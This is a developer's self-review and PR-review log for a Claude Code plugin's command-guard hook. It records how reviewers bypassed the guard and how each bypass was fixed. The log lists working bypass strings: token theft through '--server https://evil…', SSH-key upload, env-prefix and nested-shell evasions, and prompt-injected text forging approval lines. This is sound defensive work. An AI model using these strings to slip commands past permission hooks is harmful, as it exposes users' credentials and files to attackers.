# Claude Code Plugin — Lessons

Task: [20261007-claude-plugin-todo.md](20261007-claude-plugin-todo.md)

## Self-review log

### Round 1 — correctness / tests (2026-10-07)

Reviewer ran adversarial Bash strings against `guard-lib.mjs` with the
generated table, confirming shell behavior with `bash -c` / `zsh -c`.

Blocking (all fixed, each with a regression test):
1. `wafflebase docs delete abc # --help` → **allow**. The lexer kept the
   comment; the `--help` shortcut returned read-only.
2. `wafflebase docs rename D "\--help"` → **allow**. Inside `"…"` the
   lexer dropped every backslash; bash/zsh only drop it before `` $`"\ ``
   and newline, so commander got the positional `\--help`.
3. `wafflebase docs content {D,--out=.zshrc,--force}` → **allow**, i.e. a
   collaborator-controlled document overwrites a shell rc file. Brace /
   glob expansion happens after the guard looked.

Non-blocking, fixed: wrappers (`time`, `xargs`, `npx …`) made a delete
unclassified instead of asked; a `/`-prefixed name in `$(…)` escaped the
fallback; help reasons named the subcommand's level; API-key setups were
told they were logged out.

**Lesson — a guard that grants `allow` must parse with an allow-list.**
Any deny-list of shell metacharacters is one feature short (comments,
brace expansion and escape rules were three different ones). Accept
only characters that mean themselves; everything else falls to the
user's prompt. And never let a flag *lower* a command's level: a token
the guard sees may be one the shell never passes.


### Round 2 — design fit (2026-10-07, `superpowers:requesting-code-review`)

Blocking (fixed): `verify:entropy`'s knip pass reported the hook entry
points `guard.mjs` / `session-start.mjs` as unused files — they are
loaded by path from `hooks.json`, which knip cannot see — failing
`verify:self`, CI and the pre-push hook. `plugins/**` joins `scripts/**`
in knip's `ignore`; the libs are exercised by the CLI test anyway. Also
un-exported `CLI_SKILLS_INDEX`.

Important (fixed):
- Windows: `npm i -g` installs `wafflebase.cmd`; `execFileSync('wafflebase')`
  neither searches PATHEXT nor spawns `.cmd` without a shell, so every
  Windows user would have been told the CLI is not installed.
- The session context read `wafflebase status` naively, but `status`
  reports the login session only while `resolveConfig` lets
  `WAFFLEBASE_API_KEY` beat it and `WAFFLEBASE_SERVER/WORKSPACE` override
  it. Now mirrored, with a test.

Minor (fixed): publish skill stripped the extension from blob titles and
missed `files upload --folder`. Documented: release cuts must run
`pnpm cli build:plugin`; lockstep versioning delays plugin fixes to the
next cut; the marketplace clones the monorepo.

Not changed (PR known limitation): `plugins/**` has no inert lane in
`harness.config.json`, so a plugin-only PR runs the full CI matrix.

**Lesson — run `verify:self`, not only `verify:fast`, before calling a
new top-level directory done.** knip's dead-code pass lives in
`verify:entropy`, outside the pre-commit gate, and anything loaded by
path (hook scripts, CLIs) looks dead to it.

### Round 3 — security / docs (2026-10-07)

Reviewer took the attacker's seat: a collaborator who controls document
text Claude reads.

Blocking (fixed, regression-tested):
1. `wafflebase --server https://evil… docs list` → **allow**. The CLI
   sends the saved session JWT to any `--server`, and on a 401 POSTs the
   refresh token there and stores whatever tokens come back — token theft
   plus session fixation from one line of prompt injection. `--server`,
   `--api-key` and `--profile` now always ask.
2. With auto-approve on, `files upload ~/.ssh/id_rsa` → **allow**: local
   file exfiltration into a shared workspace. Commands that read a local
   file (`localInputArg`, generated) now always ask.

Non-blocking, fixed: auto-approve covered `api-keys create`, `templates
publish`, `ctx switch`, `login`, `logout` (now `NEVER_AUTO_APPROVE`);
workspace names flowed unquoted into SessionStart context (now stripped,
capped, JSON-quoted); `sh -c` / `env -S` / `eval` strings were not looked
into; several docs overclaimed what always asks.

Not changed (PR known limitation / Future work): the CLI itself still
sends a session to any `--server`; binding a session to its issuing
server is a CLI fix that protects users without the plugin too.

**Lesson — "read-only" is about the server's data, not about the
user.** Two of the worst findings were commands the registry rightly
calls read-only or write that move *credentials* or *local files*. A
guard that grants `allow` must classify by what crosses the machine
boundary (tokens out, files out, files in), not only by what the server
mutates. And review from the attacker's position found what two
correctness-minded rounds did not.

### Outcome

Three rounds, each blocking finding fixed. Round 3's fixes were verified
by their regression tests and a re-run of the adversarial repros rather
than a fourth review round (the loop is capped at three).

### PR review — CodeRabbit on #1097 (2026-10-07)

Six findings, all valid, all fixed with tests:
- **Major:** `wafflebase -- docs delete x` → **allow**. The guard read
  everything after `--` as positionals at the root, but commander still
  dispatches a subcommand named there (verified: `wafflebase -- schema
  docs.list` prints the schema).
- Wrapper options with non-numeric values (`sudo -u bob`, `xargs -a f`)
  hid the call → `null` instead of ask.
- `wafflebase>/dev/null` was one word, so neither the segment walk nor the
  recount saw the call. Redirects are now their own tokens and are
  classified as local writes / reads (`2>&1`, `/dev/null` exempt).
- Windows: through a shell a missing CLI looked like a failing one; `where`
  now decides "not installed".
- `setup` skill stopped at "log in" for API-key users.
- `packages/cli/skills/files-upload-download.md` (the source the plugin
  copies) still said uploads drop the extension; the CLI keeps it.

**Lesson — model the parser you are guarding, not the one you imagine.**
`--` meaning "end of options, rest positional" is the POSIX convention;
commander's subcommand dispatch does not honour it. Every guard rule
about argv should be checked against the real binary once.

### PR review — agent review panel on #1097 (2026-10-07)

Panel ran on `01b7a8d9` (before the CodeRabbit fixes): 6 blocking.
One (`--` before a subcommand) was already fixed. The other five, fixed
with tests:
- **Windows cwd binary planting:** `shell: true` makes cmd.exe resolve
  `wafflebase.cmd` from the cwd before PATH — a cloned repo could run code
  at session start. Now resolved from PATH by hand, spawned by absolute
  path.
- **Clustered `-c`** (`bash -lc`, `sh -ec`) and prefixed shells
  (`FOO=1 sh -c`, `time bash -c`) hid the inner call (counted twice by
  the panel, from two lenses).
- **Env spelling of the credential gate:** `WAFFLEBASE_SERVER=evil
  wafflebase docs list` was `null`, not `ask`. Any `WAFFLEBASE_*=` or
  `HOME=` prefix now counts as a connection change.
- **`cells batch` with `null` deletes** but was plain `write`, so
  auto-approve let it through. Registry now carries the variant, and the
  guard reads an inline `--data` payload to tell a delete from an edit.

Suggestions taken: references mirrored into one dir (sibling links were
broken by per-skill copies; drift test now catches stale files), CLI
version and other spawned output quoted, `--api-key` value no longer
echoed, `WAFFLEBASE_WEB_URL` keeps its basename, knip.json formatting
restored, lint-config test states the new scope, hooks.json wiring and
missing session branches tested.

Declined with reasons (PR reply): the dependency overrides stay — the
gate fails every branch without them; `allow` does not bypass a user's
explicit deny rules (Claude Code docs), so that nit does not hold; build
tooling in `src/plugin/` is not bundled (tsup's single `bin.ts` entry)
and is covered by the CLI's typecheck.

**Lesson — every way to say a thing is a way around a rule about it.**
`--server` had an env spelling; `-c` had a clustered spelling; "delete
a cell" had a batch spelling. When a guard keys on one surface form,
enumerate the others from the program's own parser (`resolveConfig`,
getopt clusters, the registry's semantics), not from the first form.

### PR review — panel second pass on #1097 (`fe00a2e6`, 2026-10-07)

6 blocking, all fixed with tests:
- The hidden-invocation **count** was defeatable: recursing into `sh -c`
  inflated `found` while the textual count skipped quoted names, so
  `sh -c 'wafflebase docs list' && $(wafflebase docs delete x)` balanced
  out. Replaced by a rule with nothing to offset: a substitution,
  subshell or group plus any mention of the name → ask.
- The unclassifiable paths echoed the whole argv, `--api-key` included,
  into the prompt. They now name only `wafflebase …`.
- Env credentials after a wrapper option value (`env -u FOO
  WAFFLEBASE_API_KEY=…`) were skipped by the jump to the program. The
  wrapper loop now consumes option values in place, so every prefix word
  is still examined — and `xargs grep wafflebase f` is no longer mistaken
  for a call.
- `guard.mjs` and `session-start.mjs` had no tests; both are now run as
  processes (stdin JSON, the exported option variable, a fake CLI on
  PATH), and the Windows PATH resolver is a pure tested function.

Also fixed: `2>file` left `2` as an argument; help/usage forms dropped
the `--server` check; "payload is null" was scanned recursively; root
options pinned by test; routes pinned to App.tsx; release doc, docs site,
CODEOWNERS, the generated-file edit hook and harness-engineering.md
updated. Design doc now states two promises of different strength.

**Lesson — stop counting, start stating.** Each pass found another
spelling past the "always ask" promise; a count of occurrences was the
worst of them, since any spelling can offset another. Make the strong
promise only where an allow-list backs it (never auto-allow what you
cannot read exactly), make the other promise best-effort *in writing*,
and prefer rules with nothing to balance (opaque form + mention → ask).

### PR review — panel third pass on #1097 (`86ca4899`, 2026-10-07)

6 blocking; 5 fixed with tests, 1 rebutted:
- argv text (an unknown subcommand, a `--server` value, file paths) went
  into the prompt verbatim — an injected command could forge "SAFE:
  approved" lines in the very text the user approves. All command-line
  text is now control/bidi-stripped and capped.
- A recognized call with `LD_PRELOAD=` / `NODE_OPTIONS=` / `PATH=` was
  silent; any `VAR=` prefix now asks.
- `env <x> sh -c '…'` hid the call; prefix skipping is now one shared
  function for both the program and inner-shell paths, and the recursion
  cap asks instead of going silent.
- POSIX SessionStart resolved `wafflebase` through a relative PATH entry;
  the cwd-planting fix made for Windows now applies on every platform.
- The recursion-cap test asserted silence; it now asserts an ask.
- **Rebutted:** "no CI lane runs cli:check on a frontend-only change" —
  `packages/frontend/**` is not in `harness.config.json`'s inert
  allow-list, so a frontend change forces the full run, `cli:check`
  included.

**Lesson — the prompt is part of the attack surface.** The guard's
reason string is what the user reads to decide; any byte of it that came
from the command is attacker-authored. Sanitize it like any other output
that crosses a trust boundary.
